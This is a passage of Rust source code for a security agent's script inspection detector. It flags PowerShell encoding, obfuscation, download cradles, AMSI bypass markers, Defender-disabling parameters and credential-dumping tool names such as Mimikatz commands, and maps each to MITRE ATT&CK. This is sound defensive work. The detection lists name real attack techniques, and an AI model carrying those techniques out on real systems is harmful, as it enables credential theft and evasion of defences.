//! Deep Script Inspection Collector
//!
//! Provides comprehensive script analysis beyond basic AMSI integration:
//! - PowerShell ScriptBlock content analysis (obfuscation, encoded commands)
//! - Known attack tool signatures (Mimikatz, PowerSploit, Empire, Covenant)
//! - AMSI bypass detection
//! - VBScript/JScript via Windows Script Host
//! - Batch file command analysis
//! - Linux: bash/sh/python script monitoring
//!
//! MITRE ATT&CK Coverage:
//! - T1059.001 - PowerShell
//! - T1059.003 - Windows Command Shell
//! - T1059.004 - Unix Shell
//! - T1059.005 - Visual Basic
//! - T1059.006 - Python
//! - T1059.007 - JavaScript
//! - T1027 - Obfuscated Files or Information
//! - T1027.010 - Command Obfuscation
//! - T1562.001 - Disable or Modify Tools (AMSI bypass)

// Deep script inspection detector. Scaffolded scoring intermediates and
// platform-specific config params are intentionally kept.
#![allow(dead_code, unused_variables, unused_assignments)]

use super::{Detection, DetectionType, EventPayload, EventType, Severity, TelemetryEvent};
use crate::config::AgentConfig;
use anyhow::Result;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use tokio::sync::mpsc;
use tracing::{debug, error, info, warn};

/// Script event types
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ScriptType {
    PowerShell,
    PowerShellCore,
    Batch,
    VBScript,
    JScript,
    JavaScript,
    Bash,
    Sh,
    Python,
    Perl,
    Ruby,
    Unknown,
}

impl ScriptType {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::PowerShell => "powershell",
            Self::PowerShellCore => "pwsh",
            Self::Batch => "batch",
            Self::VBScript => "vbscript",
            Self::JScript => "jscript",
            Self::JavaScript => "javascript",
            Self::Bash => "bash",
            Self::Sh => "sh",
            Self::Python => "python",
            Self::Perl => "perl",
            Self::Ruby => "ruby",
            Self::Unknown => "unknown",
        }
    }

    pub fn mitre_technique(&self) -> &'static str {
        match self {
            Self::PowerShell | Self::PowerShellCore => "T1059.001",
            Self::Batch => "T1059.003",
            Self::Bash | Self::Sh => "T1059.004",
            Self::VBScript => "T1059.005",
            Self::Python => "T1059.006",
            Self::JScript | Self::JavaScript => "T1059.007",
            Self::Perl | Self::Ruby | Self::Unknown => "T1059",
        }
    }
}

/// Script execution event payload
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScriptEvent {
    /// Process ID executing the script
    pub pid: u32,
    /// Parent process ID
    pub ppid: u32,
    /// Process name (e.g., powershell.exe)
    pub process_name: String,
    /// Process path
    pub process_path: String,
    /// Script type
    pub script_type: ScriptType,
    /// Original command line
    pub cmdline: String,
    /// Script content (if captured)
    pub content: Option<String>,
    /// Deobfuscated content (if applicable)
    pub deobfuscated_content: Option<String>,
    /// Script file path (if from file)
    pub script_path: Option<String>,
    /// User executing the script
    pub user: String,
    /// Is the process running elevated
    pub is_elevated: bool,
    /// Detected obfuscation techniques
    pub obfuscation_techniques: Vec<String>,
    /// Detected suspicious patterns
    pub suspicious_patterns: Vec<String>,
    /// Detected attack tools
    pub attack_tools: Vec<String>,
    /// Risk score (0.0 - 1.0)
    pub risk_score: f32,
}

/// Detection match from script analysis
#[derive(Debug, Clone)]
pub struct ScriptMatch {
    pub rule_name: String,
    pub category: MatchCategory,
    pub description: String,
    pub confidence: f32,
    pub matched_content: String,
    pub mitre_tactics: Vec<String>,
    pub mitre_techniques: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum MatchCategory {
    Obfuscation,
    EncodedCommand,
    DownloadCradle,
    AttackTool,
    AmsiBypass,
    DefenderEvasion,
    Reflection,
    ProcessInjection,
    CredentialAccess,
    Persistence,
    Discovery,
    Exfiltration,
}

impl MatchCategory {
    pub fn severity(&self) -> Severity {
        match self {
            Self::AttackTool
            | Self::AmsiBypass
            | Self::ProcessInjection
            | Self::CredentialAccess => Severity::Critical,
            Self::DownloadCradle | Self::DefenderEvasion | Self::Reflection => Severity::High,
            Self::EncodedCommand | Self::Persistence | Self::Exfiltration => Severity::High,
            Self::Obfuscation | Self::Discovery => Severity::Medium,
        }
    }
}

/// Script Inspector Collector
pub struct ScriptInspector {
    config: AgentConfig,
    event_rx: mpsc::Receiver<TelemetryEvent>,
    event_tx: mpsc::Sender<TelemetryEvent>,
    running: Arc<AtomicBool>,
    /// Known script PIDs to avoid duplicate analysis
    known_script_pids: Arc<tokio::sync::Mutex<HashSet<u32>>>,
}

impl ScriptInspector {
    /// Create a new script inspector
    pub fn new(config: &AgentConfig) -> Result<Self> {
        let (tx, rx) = mpsc::channel(1000);
        let running = Arc::new(AtomicBool::new(true));
        let known_pids = Arc::new(tokio::sync::Mutex::new(HashSet::new()));

        info!("Initializing Script Inspector (deep script analysis)");

        // Start the monitoring task
        let tx_clone = tx.clone();
        let config_clone = config.clone();
        let running_clone = running.clone();
        let known_pids_clone = known_pids.clone();

        tokio::spawn(async move {
            if let Err(e) =
                Self::monitor_loop(tx_clone, config_clone, running_clone, known_pids_clone).await
            {
                error!(error = %e, "Script inspector monitor error");
            }
        });

        Ok(Self {
            config: config.clone(),
            event_rx: rx,
            event_tx: tx,
            running,
            known_script_pids: known_pids,
        })
    }

    /// Main monitoring loop
    async fn monitor_loop(
        tx: mpsc::Sender<TelemetryEvent>,
        config: AgentConfig,
        running: Arc<AtomicBool>,
        known_pids: Arc<tokio::sync::Mutex<HashSet<u32>>>,
    ) -> Result<()> {
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(250));

        while running.load(Ordering::SeqCst) {
            interval.tick().await;

            // Platform-specific monitoring
            #[cfg(target_os = "windows")]
            {
                if let Err(e) = Self::monitor_windows_scripts(&tx, &config, &known_pids).await {
                    debug!(error = %e, "Windows script monitoring error");
                }
            }

            #[cfg(target_os = "linux")]
            {
                if let Err(e) = Self::monitor_linux_scripts(&tx, &config, &known_pids).await {
                    debug!(error = %e, "Linux script monitoring error");
                }
            }

            #[cfg(target_os = "macos")]
            {
                if let Err(e) = Self::monitor_macos_scripts(&tx, &config, &known_pids).await {
                    debug!(error = %e, "macOS script monitoring error");
                }
            }
        }

        Ok(())
    }

    /// Get next event from collector
    pub async fn next_event(&mut self) -> Option<TelemetryEvent> {
        self.event_rx.recv().await
    }

    /// Analyze script content and return detections
    pub fn analyze_script(content: &str, script_type: &ScriptType) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();

        // Run all detection modules
        matches.extend(Self::detect_encoding(content));
        matches.extend(Self::detect_obfuscation(content, script_type));
        matches.extend(Self::detect_download_cradles(content));
        matches.extend(Self::detect_attack_tools(content));
        matches.extend(Self::detect_amsi_bypass(content));
        matches.extend(Self::detect_defender_evasion(content));
        matches.extend(Self::detect_reflection(content));
        matches.extend(Self::detect_credential_access(content));
        matches.extend(Self::detect_persistence(content, script_type));

        matches
    }

    /// Detect encoded commands (Base64, compression, etc.)
    fn detect_encoding(content: &str) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        // PowerShell encoded command patterns
        let encoded_patterns = [
            (
                r"-enc\s+[A-Za-z0-9+/=]{20,}",
                "PowerShell -enc flag with Base64",
            ),
            (
                r"-encodedcommand\s+[A-Za-z0-9+/=]{20,}",
                "PowerShell -EncodedCommand with Base64",
            ),
            (
                r"-e\s+[A-Za-z0-9+/=]{50,}",
                "PowerShell -e shorthand with Base64",
            ),
            (
                r"\[System\.Convert\]::FromBase64String",
                "Base64 decoding via .NET",
            ),
            (
                r"\[Text\.Encoding\]::UTF8\.GetString",
                "String decoding from bytes",
            ),
            (
                r#"FromBase64String\s*\(\s*['"][A-Za-z0-9+/=]{50,}"#,
                "Inline Base64 decoding",
            ),
        ];

        for (pattern, desc) in encoded_patterns {
            if let Ok(re) = regex::Regex::new(&format!("(?i){}", pattern)) {
                if let Some(m) = re.find(content) {
                    matches.push(ScriptMatch {
                        rule_name: "encoded_command".to_string(),
                        category: MatchCategory::EncodedCommand,
                        description: desc.to_string(),
                        confidence: 0.85,
                        matched_content: m.as_str().chars().take(200).collect(),
                        mitre_tactics: vec!["Defense Evasion".to_string(), "Execution".to_string()],
                        mitre_techniques: vec!["T1027".to_string(), "T1059.001".to_string()],
                    });
                }
            }
        }

        // Detect compressed/deflated content
        if content_lower.contains("io.compression.deflatestream")
            || content_lower.contains("gzipstream")
            || content_lower.contains("io.compression.gzipstream")
        {
            matches.push(ScriptMatch {
                rule_name: "compressed_payload".to_string(),
                category: MatchCategory::EncodedCommand,
                description: "Compressed/deflated payload detected".to_string(),
                confidence: 0.80,
                matched_content: "Compression stream usage".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1027".to_string()],
            });
        }

        // Detect SecureString abuse for obfuscation
        if content_lower.contains("convertto-securestring")
            && content_lower.contains("convertfrom-securestring")
        {
            matches.push(ScriptMatch {
                rule_name: "securestring_obfuscation".to_string(),
                category: MatchCategory::EncodedCommand,
                description: "SecureString used for obfuscation".to_string(),
                confidence: 0.75,
                matched_content: "SecureString conversion pattern".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1027".to_string()],
            });
        }

        matches
    }

    /// Detect obfuscation patterns
    fn detect_obfuscation(content: &str, script_type: &ScriptType) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        // String concatenation obfuscation
        // Pattern: 'i'+'e'+'x' or "pow"+"ers"+"hell"
        let concat_count = content.matches("'+").count()
            + content.matches(r#""+""#).count()
            + content.matches("'+'").count()
            + content.matches(r#""+""#).count();

        // Each quoted concatenation contributes roughly two matches above, so a
        // count > 3 corresponds to two or more chained concatenations (e.g. the
        // classic 'i'+'e'+'x' IEX obfuscation). A single benign concat scores 2.
        if concat_count > 3 {
            matches.push(ScriptMatch {
                rule_name: "string_concatenation".to_string(),
                category: MatchCategory::Obfuscation,
                description: format!(
                    "String concatenation obfuscation detected ({} instances)",
                    concat_count
                ),
                confidence: 0.7 + (concat_count as f32 * 0.02).min(0.25),
                matched_content: format!("{} concatenation operations", concat_count),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1027.010".to_string()],
            });
        }

        // Character code obfuscation: [char]0x41 or [char]65
        let char_code_pattern = regex::Regex::new(r"\[char\]\s*(0x[0-9a-fA-F]+|\d+)").ok();
        if let Some(re) = char_code_pattern {
            let char_count = re.find_iter(content).count();
            if char_count > 3 {
                matches.push(ScriptMatch {
                    rule_name: "char_code_obfuscation".to_string(),
                    category: MatchCategory::Obfuscation,
                    description: format!("Character code obfuscation ({} instances)", char_count),
                    confidence: 0.75,
                    matched_content: format!("{} [char] conversions", char_count),
                    mitre_tactics: vec!["Defense Evasion".to_string()],
                    mitre_techniques: vec!["T1027.010".to_string()],
                });
            }
        }

        // Format string obfuscation: "{0}{1}" -f 'ie','x'
        if content_lower.contains("-f ") || content_lower.contains("-f'") {
            let format_pattern =
                regex::Regex::new(r#"\{[\d,]+\}.*-f\s*['"][^'"]+['"](,\s*['"][^'"]+['"])+"#).ok();
            if let Some(re) = format_pattern {
                if re.is_match(content) {
                    matches.push(ScriptMatch {
                        rule_name: "format_string_obfuscation".to_string(),
                        category: MatchCategory::Obfuscation,
                        description: "Format string operator used for obfuscation".to_string(),
                        confidence: 0.8,
                        matched_content: "-f format operator".to_string(),
                        mitre_tactics: vec!["Defense Evasion".to_string()],
                        mitre_techniques: vec!["T1027.010".to_string()],
                    });
                }
            }
        }

        // Tick/backtick obfuscation: i`e`x or pow`ersh`ell
        let tick_count = content.matches('`').count();
        if tick_count > 10 {
            matches.push(ScriptMatch {
                rule_name: "backtick_obfuscation".to_string(),
                category: MatchCategory::Obfuscation,
                description: format!("Backtick obfuscation detected ({} ticks)", tick_count),
                confidence: 0.7,
                matched_content: format!("{} backticks in script", tick_count),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1027.010".to_string()],
            });
        }

        // Variable substitution obfuscation: ${e}xec or $env:comspec
        if content_lower.contains("${") && content.matches("${").count() > 3 {
            matches.push(ScriptMatch {
                rule_name: "variable_substitution".to_string(),
                category: MatchCategory::Obfuscation,
                description: "Variable substitution obfuscation".to_string(),
                confidence: 0.65,
                matched_content: "Multiple ${} substitutions".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1027.010".to_string()],
            });
        }

        // Invoke-Expression variants
        let iex_patterns = [
            "invoke-expression",
            "iex",
            "&('i'+'e'+'x')",
            ".('{0}{1}'-f'ie','x')",
            ".('iex')",
            "&([scriptblock]::create",
            "| iex",
            "|iex",
        ];

        for pattern in iex_patterns {
            if content_lower.contains(pattern) {
                matches.push(ScriptMatch {
                    rule_name: "invoke_expression".to_string(),
                    category: MatchCategory::Obfuscation,
                    description: format!("Invoke-Expression pattern: {}", pattern),
                    confidence: 0.85,
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec!["Execution".to_string(), "Defense Evasion".to_string()],
                    mitre_techniques: vec!["T1059.001".to_string()],
                });
                break;
            }
        }

        // Caret obfuscation in batch files (cmd ^& or p^o^w^e^r^s^h^e^l^l)
        if matches!(script_type, ScriptType::Batch) {
            let caret_count = content.matches('^').count();
            if caret_count > 5 {
                matches.push(ScriptMatch {
                    rule_name: "caret_obfuscation".to_string(),
                    category: MatchCategory::Obfuscation,
                    description: format!("Caret obfuscation in batch ({} carets)", caret_count),
                    confidence: 0.75,
                    matched_content: format!("{} caret characters", caret_count),
                    mitre_tactics: vec!["Defense Evasion".to_string()],
                    mitre_techniques: vec!["T1027.010".to_string()],
                });
            }
        }

        matches
    }

    /// Detect download cradle patterns
    fn detect_download_cradles(content: &str) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        // PowerShell download cradles
        let cradle_patterns = [
            (
                "net.webclient",
                "downloadstring",
                "WebClient DownloadString cradle",
            ),
            (
                "net.webclient",
                "downloadfile",
                "WebClient DownloadFile cradle",
            ),
            (
                "net.webclient",
                "downloaddata",
                "WebClient DownloadData cradle",
            ),
            ("invoke-webrequest", "", "Invoke-WebRequest (iwr) download"),
            ("invoke-restmethod", "", "Invoke-RestMethod download"),
            ("start-bitstransfer", "", "BITS transfer download"),
            ("bitsadmin", "/transfer", "BITSAdmin transfer"),
            ("certutil", "-urlcache", "Certutil URL cache download"),
            ("curl", "", "Curl download"),
            ("wget", "", "Wget download"),
            ("system.net.httpwebrequest", "", "HttpWebRequest download"),
            ("system.net.http.httpclient", "", "HttpClient download"),
            ("xml.load", "http", "XML document load from URL"),
            ("msxml2.xmlhttp", "", "MSXML HTTP request"),
            ("winhttprequest", "", "WinHTTP request"),
        ];

        for (pattern1, pattern2, desc) in cradle_patterns {
            if content_lower.contains(pattern1)
                && (pattern2.is_empty() || content_lower.contains(pattern2))
            {
                matches.push(ScriptMatch {
                    rule_name: "download_cradle".to_string(),
                    category: MatchCategory::DownloadCradle,
                    description: desc.to_string(),
                    confidence: 0.85,
                    matched_content: pattern1.to_string(),
                    mitre_tactics: vec!["Command and Control".to_string(), "Execution".to_string()],
                    mitre_techniques: vec!["T1105".to_string(), "T1059.001".to_string()],
                });
            }
        }

        // IEX combined with download
        if (content_lower.contains("iex") || content_lower.contains("invoke-expression"))
            && (content_lower.contains("downloadstring")
                || content_lower.contains("invoke-webrequest")
                || content_lower.contains("invoke-restmethod"))
        {
            matches.push(ScriptMatch {
                rule_name: "iex_download_execute".to_string(),
                category: MatchCategory::DownloadCradle,
                description: "IEX with download - direct code execution from remote".to_string(),
                confidence: 0.95,
                matched_content: "IEX (download)".to_string(),
                mitre_tactics: vec!["Execution".to_string(), "Command and Control".to_string()],
                mitre_techniques: vec!["T1059.001".to_string(), "T1105".to_string()],
            });
        }

        matches
    }

    /// Detect known attack tools and frameworks
    fn detect_attack_tools(content: &str) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        // Mimikatz indicators
        let mimikatz_patterns = [
            ("invoke-mimikatz", "Invoke-Mimikatz cmdlet"),
            ("mimikatz", "Mimikatz reference"),
            ("sekurlsa::logonpasswords", "Mimikatz logonpasswords"),
            ("sekurlsa::wdigest", "Mimikatz wdigest"),
            ("sekurlsa::kerberos", "Mimikatz kerberos"),
            ("lsadump::sam", "Mimikatz SAM dump"),
            ("lsadump::dcsync", "Mimikatz DCSync"),
            ("kerberos::golden", "Mimikatz golden ticket"),
            ("kerberos::ptt", "Mimikatz pass-the-ticket"),
            ("privilege::debug", "Mimikatz debug privilege"),
            ("token::elevate", "Mimikatz token elevation"),
        ];

        for (pattern, desc) in mimikatz_patterns {
            if content_lower.contains(pattern) {
                matches.push(ScriptMatch {
                    rule_name: "mimikatz".to_string(),
                    category: MatchCategory::AttackTool,
                    description: format!("Mimikatz detected: {}", desc),
                    confidence: 0.98,
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec!["Credential Access".to_string()],
                    mitre_techniques: vec!["T1003".to_string(), "T1003.001".to_string()],
                });
                break; // One match is enough
            }
        }

        // PowerSploit indicators
        let powersploit_patterns = [
            ("invoke-shellcode", "PowerSploit Invoke-Shellcode"),
            ("invoke-reflectivepeinjection", "PowerSploit PE injection"),
            ("invoke-dllinjection", "PowerSploit DLL injection"),
            ("invoke-tokenmanipulation", "PowerSploit token manipulation"),
            (
                "invoke-credentialinjection",
                "PowerSploit credential injection",
            ),
            ("get-gpppassword", "PowerSploit GPP password"),
            ("get-gppautologon", "PowerSploit GPP autologon"),
            ("invoke-kerberoast", "PowerSploit Kerberoasting"),
            ("invoke-userhunter", "PowerSploit user hunting"),
            ("get-netdomain", "PowerSploit domain enumeration"),
            ("get-netforest", "PowerSploit forest enumeration"),
            ("invoke-portscan", "PowerSploit port scanning"),
            ("invoke-mimikittenz", "PowerSploit Mimikittenz"),
            ("invoke-ninjacopy", "PowerSploit NinjaCopy"),
            ("invoke-wmicommand", "PowerSploit WMI command"),
        ];

        for (pattern, desc) in powersploit_patterns {
            if content_lower.contains(pattern) {
                matches.push(ScriptMatch {
                    rule_name: "powersploit".to_string(),
                    category: MatchCategory::AttackTool,
                    description: format!("PowerSploit: {}", desc),
                    confidence: 0.95,
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec![
                        "Execution".to_string(),
                        "Credential Access".to_string(),
                        "Defense Evasion".to_string(),
                    ],
                    mitre_techniques: vec!["T1059.001".to_string()],
                });
            }
        }

        // Empire/Covenant indicators
        let c2_patterns = [
            ("invoke-empire", "Empire framework"),
            ("invoke-psempire", "PSEmpire"),
            ("invoke-agentjob", "Covenant agent job"),
            ("grunt", "Covenant Grunt"),
            ("covenant", "Covenant C2"),
            ("stager", "C2 stager"),
            ("listener", "C2 listener reference"),
        ];

        for (pattern, desc) in c2_patterns {
            if content_lower.contains(pattern) {
                let context_check = content_lower.contains("http")
                    || content_lower.contains("socket")
                    || content_lower.contains("encrypt");
                if context_check {
                    matches.push(ScriptMatch {
                        rule_name: "c2_framework".to_string(),
                        category: MatchCategory::AttackTool,
                        description: format!("C2 Framework: {}", desc),
                        confidence: 0.90,
                        matched_content: pattern.to_string(),
                        mitre_tactics: vec!["Command and Control".to_string()],
                        mitre_techniques: vec!["T1071".to_string()],
                    });
                }
            }
        }

        // Other attack tools
        let other_tools = [
            ("sharphound", "BloodHound collection tool", "T1087"),
            ("rubeus", "Rubeus Kerberos tool", "T1558"),
            ("seatbelt", "Seatbelt enumeration", "T1082"),
            ("sharpup", "SharpUp privilege escalation check", "T1068"),
            ("sharpview", "SharpView AD enumeration", "T1087"),
            ("safetykatz", "SafetyKatz credential dump", "T1003"),
            ("sharpwmi", "SharpWMI lateral movement", "T1047"),
            ("sharpdpapi", "SharpDPAPI credential access", "T1555"),
            ("lazagne", "LaZagne credential access", "T1555"),
            ("crackmapexec", "CrackMapExec", "T1021"),
        ];

        for (pattern, desc, technique) in other_tools {
            if content_lower.contains(pattern) {
                matches.push(ScriptMatch {
                    rule_name: format!("attack_tool_{}", pattern),
                    category: MatchCategory::AttackTool,
                    description: desc.to_string(),
                    confidence: 0.92,
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec!["Execution".to_string()],
                    mitre_techniques: vec![technique.to_string()],
                });
            }
        }

        matches
    }

    /// Detect AMSI bypass attempts
    fn detect_amsi_bypass(content: &str) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        // Common AMSI bypass patterns
        let amsi_patterns = [
            // Classic memory patching
            ("amsiutils", "AMSI Utils reference"),
            ("amsiinitfailed", "AMSI Init Failed flag"),
            ("amsi.dll", "Direct AMSI DLL reference"),
            ("amsiscanbuffer", "AmsiScanBuffer reference"),
            ("amsiscanstring", "AmsiScanString reference"),
            // Reflection-based bypass
            (
                "system.management.automation.amsiutils",
                "PowerShell AMSI Utils reflection",
            ),
            // Matt Graeber's bypass
            ("amsiinitialize", "AMSI Initialize hook"),
            ("amsi]::$", "AMSI static field access"),
            // Force error
            ("amsiopensession", "AMSI OpenSession manipulation"),
        ];

        for (pattern, desc) in amsi_patterns {
            if content_lower.contains(pattern) {
                matches.push(ScriptMatch {
                    rule_name: "amsi_bypass".to_string(),
                    category: MatchCategory::AmsiBypass,
                    description: format!("AMSI bypass attempt: {}", desc),
                    confidence: 0.95,
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec!["Defense Evasion".to_string()],
                    mitre_techniques: vec!["T1562.001".to_string()],
                });
            }
        }

        // Detect null byte AMSI bypass
        if content.contains("\0") {
            let null_count = content.chars().filter(|&c| c == '\0').count();
            if null_count > 0 {
                matches.push(ScriptMatch {
                    rule_name: "amsi_null_bypass".to_string(),
                    category: MatchCategory::AmsiBypass,
                    description: format!(
                        "Null byte injection (AMSI bypass) - {} null bytes",
                        null_count
                    ),
                    confidence: 0.85,
                    matched_content: "Null bytes in script".to_string(),
                    mitre_tactics: vec!["Defense Evasion".to_string()],
                    mitre_techniques: vec!["T1562.001".to_string()],
                });
            }
        }

        // Assembly load for AMSI bypass
        if content_lower.contains("loadlibrary") && content_lower.contains("amsi") {
            matches.push(ScriptMatch {
                rule_name: "amsi_library_bypass".to_string(),
                category: MatchCategory::AmsiBypass,
                description: "LoadLibrary-based AMSI manipulation".to_string(),
                confidence: 0.90,
                matched_content: "LoadLibrary + amsi".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1562.001".to_string()],
            });
        }

        matches
    }

    /// Detect Windows Defender evasion
    fn detect_defender_evasion(content: &str) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        let defender_patterns = [
            (
                "set-mppreference",
                "-disablerealtimemonitoring",
                "Disable real-time monitoring",
            ),
            (
                "set-mppreference",
                "-disablebehaviormonitoring",
                "Disable behavior monitoring",
            ),
            (
                "set-mppreference",
                "-disablescriptscanning",
                "Disable script scanning",
            ),
            (
                "set-mppreference",
                "-disableioavprotection",
                "Disable IOAV protection",
            ),
            (
                "set-mppreference",
                "-disableblockatfirstseen",
                "Disable block at first seen",
            ),
            ("add-mppreference", "-exclusionpath", "Add exclusion path"),
            (
                "add-mppreference",
                "-exclusionprocess",
                "Add exclusion process",
            ),
            (
                "add-mppreference",
                "-exclusionextension",
                "Add exclusion extension",
            ),
            (
                "remove-mppreference",
                "-exclusionpath",
                "Remove exclusion (cleanup)",
            ),
        ];

        for (cmd, param, desc) in defender_patterns {
            if content_lower.contains(cmd) && content_lower.contains(param) {
                matches.push(ScriptMatch {
                    rule_name: "defender_evasion".to_string(),
                    category: MatchCategory::DefenderEvasion,
                    description: format!("Defender evasion: {}", desc),
                    confidence: 0.95,
                    matched_content: format!("{} {}", cmd, param),
                    mitre_tactics: vec!["Defense Evasion".to_string()],
                    mitre_techniques: vec!["T1562.001".to_string()],
                });
            }
        }

        // Firewall manipulation
        if content_lower.contains("netsh") && content_lower.contains("firewall") {
            matches.push(ScriptMatch {
                rule_name: "firewall_manipulation".to_string(),
                category: MatchCategory::DefenderEvasion,
                description: "Firewall manipulation via netsh".to_string(),
                confidence: 0.80,
                matched_content: "netsh firewall".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1562.004".to_string()],
            });
        }

        // Event log tampering
        if content_lower.contains("clear-eventlog")
            || content_lower.contains("wevtutil")
                && (content_lower.contains("cl") || content_lower.contains("clear"))
        {
            matches.push(ScriptMatch {
                rule_name: "eventlog_tampering".to_string(),
                category: MatchCategory::DefenderEvasion,
                description: "Event log clearing/tampering".to_string(),
                confidence: 0.90,
                matched_content: "Event log manipulation".to_string(),
                mitre_tactics: vec!["Defense Evasion".to_string()],
                mitre_techniques: vec!["T1070.001".to_string()],
            });
        }

        matches
    }

    /// Detect reflection-based loading
    fn detect_reflection(content: &str) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        let reflection_patterns = [
            (
                "[system.reflection.assembly]::load",
                "Assembly.Load reflective loading",
            ),
            ("[reflection.assembly]::load", "Assembly.Load (short form)"),
            ("loadfile", "Assembly LoadFile"),
            ("loadfrom", "Assembly LoadFrom"),
            ("getmethod", "Reflection GetMethod"),
            ("invoke(", "Method Invoke call"),
            ("gettype(", "GetType for reflection"),
            ("definedynamicassembly", "Dynamic assembly creation"),
            ("definemethod", "Dynamic method definition"),
            ("createinstance", "Activator CreateInstance"),
            (
                "[runtime.interopservices.marshal]::copy",
                "Marshal memory copy",
            ),
            ("virtualalloc", "VirtualAlloc (shellcode)"),
            ("virtualprotect", "VirtualProtect (shellcode)"),
            ("createthread", "CreateThread (shellcode)"),
            ("ntwritevirtualmemory", "NtWriteVirtualMemory injection"),
        ];

        for (pattern, desc) in reflection_patterns {
            if content_lower.contains(pattern) {
                let is_shellcode = content_lower.contains("virtualalloc")
                    || content_lower.contains("createthread")
                    || content_lower.contains("0x") && content.len() > 500;

                matches.push(ScriptMatch {
                    rule_name: if is_shellcode {
                        "shellcode_injection".to_string()
                    } else {
                        "reflection_loading".to_string()
                    },
                    category: if is_shellcode {
                        MatchCategory::ProcessInjection
                    } else {
                        MatchCategory::Reflection
                    },
                    description: desc.to_string(),
                    confidence: if is_shellcode { 0.95 } else { 0.75 },
                    matched_content: pattern.to_string(),
                    mitre_tactics: vec!["Execution".to_string(), "Defense Evasion".to_string()],
                    mitre_techniques: if is_shellcode {
                        vec!["T1055".to_string(), "T1620".to_string()]
                    } else {
                        vec!["T1620".to_string()]
                    },
                });
            }
        }

        matches
    }

    /// Detect credential access attempts
    fn detect_credential_access(content: &str) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        let cred_patterns: [(&str, &str, f32); 14] = [
            ("get-credential", "Credential prompt", 0.5),
            ("lsass", "LSASS reference", 0.85),
            ("sam", "SAM database reference", 0.7),
            ("ntds.dit", "NTDS.dit (AD database)", 0.95),
            (
                "system.web.security.membership",
                "Membership credentials",
                0.7,
            ),
            ("dpapi", "DPAPI reference", 0.75),
            ("credential", "Credential keyword", 0.4),
            ("password", "Password keyword", 0.4),
            ("kerberos", "Kerberos reference", 0.6),
            ("tgt", "TGT (Kerberos ticket)", 0.7),
            ("ntlm", "NTLM reference", 0.6),
            ("credentialguard", "Credential Guard bypass", 0.85),
            ("wdigest", "WDigest credentials", 0.8),
            ("vault::cred", "Credential vault", 0.75),
        ];

        for (pattern, desc, base_confidence) in cred_patterns {
            if content_lower.contains(pattern) {
                // Increase confidence if multiple credential-related patterns
                let additional_context = content_lower.contains("dump")
                    || content_lower.contains("extract")
                    || content_lower.contains("steal")
                    || content_lower.contains("mimikatz")
                    || content_lower.contains("procdump");

                let confidence: f32 = if additional_context {
                    (base_confidence + 0.2).min(0.98)
                } else {
                    base_confidence
                };

                if confidence >= 0.6 {
                    // Only report higher confidence matches
                    matches.push(ScriptMatch {
                        rule_name: "credential_access".to_string(),
                        category: MatchCategory::CredentialAccess,
                        description: desc.to_string(),
                        confidence,
                        matched_content: pattern.to_string(),
                        mitre_tactics: vec!["Credential Access".to_string()],
                        mitre_techniques: vec!["T1003".to_string()],
                    });
                }
            }
        }

        matches
    }

    /// Detect persistence mechanisms
    fn detect_persistence(content: &str, script_type: &ScriptType) -> Vec<ScriptMatch> {
        let mut matches = Vec::new();
        let content_lower = content.to_lowercase();

        let persistence_patterns = [
            ("schtasks", "/create", "Scheduled task creation"),
            ("register-scheduledjob", "", "PowerShell scheduled job"),
            ("new-scheduledtaskaction", "", "Scheduled task action"),
            (
                "hklm:\\software\\microsoft\\windows\\currentversion\\run",
                "",
                "Run key persistence",
            ),
            (
                "hkcu:\\software\\microsoft\\windows\\currentversion\\run",
                "",
                "User Run key persistence",
            ),
            ("startup", "\\programs\\", "Startup folder persistence"),
            ("wmi", "eventsubscription", "WMI event subscription"),
            (
                "new-itemproperty",
                "run",
                "Registry Run key via New-ItemProperty",
            ),
            ("sc", "create", "Service creation"),
            ("new-service", "", "PowerShell service creation"),
            ("bits", "setnotifycmdline", "BITS job persistence"),
        ];

        for (pattern1, pattern2, desc) in persistence_patterns {
            if content_lower.contains(pattern1)
                && (pattern2.is_empty() || content_lower.contains(pattern2))
            {
                matches.push(ScriptMatch {
                    rule_name: "persistence_mechanism".to_string(),
                    category: MatchCategory::Persistence,
                    description: desc.to_string(),
                    confidence: 0.85,
                    matched_content: if pattern2.is_empty() {
                        pattern1.to_string()
                    } else {
                        format!("{} {}", pattern1, pattern2)
                    },
                    mitre_tactics: vec!["Persistence".to_string()],
                    mitre_techniques: vec!["T1053".to_string(), "T1547".to_string()],
                });
            }
        }

        // Linux-specific persistence
        if matches!(script_type, ScriptType::Bash | ScriptType::Sh) {
